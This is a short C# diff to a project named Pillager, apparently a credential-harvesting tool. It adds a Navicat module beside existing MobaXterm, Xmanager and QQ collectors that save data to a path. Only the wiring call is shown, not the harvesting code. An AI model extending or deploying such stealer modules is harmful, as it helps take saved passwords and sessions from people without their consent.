@@ -29,6 +29,7 @@ namespace Pillager
             //Tools
             MobaXterm.Save(savepath);
             Xmanager.Save(savepath);
+            Navicat.Save(savepath);
 
             //Messengers
             QQ.Save(savepath);
